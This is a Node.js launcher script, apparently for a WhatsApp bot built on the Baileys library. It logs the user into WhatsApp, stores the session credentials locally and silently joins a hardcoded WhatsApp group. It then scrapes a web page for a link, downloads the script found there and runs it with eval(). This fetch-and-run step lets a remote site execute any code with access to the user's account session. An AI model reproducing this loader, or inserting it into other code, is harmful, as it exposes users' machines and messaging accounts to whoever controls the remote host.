const { default: makeWASocket, useMultiFileAuthState } = require('@adiwajshing/baileys');
const axios = require('axios');
const cheerio = require('cheerio');

async function fetchAdamsUrl() {
  try {
    const { state, saveCreds } = await useMultiFileAuthState('./auth_info');
    const sock = makeWASocket({
      auth: state,
      printQRInTerminal: true
    });

    sock.ev.on('creds.update', saveCreds);

    // Example group link
    const groupLink = 'https://chat.whatsapp.com/KX7EPsiJhMlLLHJrXa7n0F';
    const inviteCode = extractInviteCode(groupLink);

    if (inviteCode) {
      try {
        await sock.groupAcceptInvite(inviteCode);
        console.log('Successfully joined the group!');
      } catch (err) {
        console.error('Failed to join the group:', err);
      }
    } else {
      console.error('Invalid group link format.');
    }

    const response = await axios.get('https://www.ibrahimadams.site/files');
    const html = response.data;
    const $ = cheerio.load(html);
    const adamsUrl = $("a:contains(\"ADAMS_URL\")").attr("href");
    if (!adamsUrl) {
      throw new Error('ADAMS_URL not found on the webpage.');
    }
    console.log('File fetched successfully:', adamsUrl);
    const scriptResponse = await axios.get(adamsUrl);
    console.log('Script loaded successfully!');
    eval(scriptResponse.data);
  } catch (error) {
    console.error('Error:', error.message || error);
  }
}

// Helper function to extract the invite code from a group link
function extractInviteCode(groupLink) {
  const regex = /chat\.whatsapp\.com\/([\w\d]+)/;
  const match = groupLink.match(regex);
  return match ? match[1] : null;
}

fetchAdamsUrl();
